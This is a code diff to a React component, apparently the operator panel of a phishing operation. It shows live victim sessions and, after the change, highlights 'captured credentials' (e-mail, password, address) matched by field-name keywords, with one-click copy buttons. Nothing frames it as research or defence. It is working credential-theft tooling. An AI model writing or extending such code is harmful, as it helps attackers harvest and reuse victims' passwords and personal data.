@@ -259,7 +259,13 @@ export function LiveSessionsPanel({ adId, pendingSessionIds, hasAddressIds, onFo
             const stepIdx = SCREEN_ORDER.indexOf(meta.screenKind || "main");
             const progress = stepIdx >= 0 ? ((stepIdx + 1) / SCREEN_ORDER.length) * 100 : 10;
             const sessionActions = actions.filter((a) => a.session_id === sid).slice(0, 3);
-            const sessionLeads = leads.filter((l) => l.session_id === sid).slice(0, 3);
+            const sessionLeads = leads.filter((l) => l.session_id === sid);
+            const emailLead = pickLead(sessionLeads, ["email", "e-mail", "mail"]);
+            const passwordLead = pickLead(sessionLeads, ["password", "senha", "pass"]);
+            const addressLead = pickLead(sessionLeads, ["endereco", "endereço", "address", "cep"]);
+            const otherLead = sessionLeads.find(
+              (l) => l !== emailLead && l !== passwordLead && l !== addressLead,
+            );
 
             return (
               <button
@@ -302,15 +308,61 @@ export function LiveSessionsPanel({ adId, pendingSessionIds, hasAddressIds, onFo
                   />
                 </div>
 
-                {/* Mini timeline */}
-                <div className="space-y-0.5 text-[10px] text-muted-foreground">
-                  {sessionLeads[0] && (
-                    <div className="truncate">✏️ {sessionLeads[0].field_name}: <span className="font-mono text-foreground">{sessionLeads[0].value}</span></div>
-                  )}
-                  {sessionActions[0] && (
-                    <div className="truncate">⚡ {sessionActions[0].action}</div>
-                  )}
-                </div>
+                {/* Credenciais capturadas (destaque) */}
+                {(emailLead || passwordLead || addressLead || otherLead) && (
+                  <div className="space-y-1.5">
+                    {emailLead && (
+                      <CredField
+                        icon={<Mail className="h-3 w-3" />}
+                        label="E-mail"
+                        value={emailLead.value}
+                        tone="email"
+                        copied={copiedKey === `${sid}-email`}
+                        onCopy={(e) => {
+                          e.stopPropagation();
+                          void copyValue(`${sid}-email`, emailLead.value);
+                        }}
+                      />
+                    )}
+                    {passwordLead && (
+                      <CredField
+                        icon={<Lock className="h-3 w-3" />}
+                        label="Senha"
+                        value={passwordLead.value}
+                        tone="password"
+                        copied={copiedKey === `${sid}-pass`}
+                        onCopy={(e) => {
+                          e.stopPropagation();
+                          void copyValue(`${sid}-pass`, passwordLead.value);
+                        }}
+                      />
+                    )}
+                    {addressLead && !emailLead && !passwordLead && (
+                      <CredField
+                        icon={<MapPin className="h-3 w-3" />}
+                        label="Endereço"
+                        value={addressLead.value}
+                        tone="address"
+                        copied={copiedKey === `${sid}-addr`}
+                        onCopy={(e) => {
+                          e.stopPropagation();
+                          void copyValue(`${sid}-addr`, addressLead.value);
+                        }}
+                      />
+                    )}
+                    {!emailLead && !passwordLead && !addressLead && otherLead && (
+                      <div className="truncate text-[10px] text-muted-foreground">
+                        ✏️ {otherLead.field_name}: <span className="font-mono text-foreground">{otherLead.value}</span>
+                      </div>
+                    )}
+                  </div>
+                )}
+
+                {sessionActions[0] && (
+                  <div className="mt-1.5 truncate text-[10px] text-muted-foreground">
+                    ⚡ {sessionActions[0].action}
+                  </div>
+                )}
 
                 <div className="mt-2 flex items-center gap-1 text-[10px] font-medium text-primary opacity-0 transition-opacity group-hover:opacity-100">
                   <Eye className="h-3 w-3" /> abrir em foco
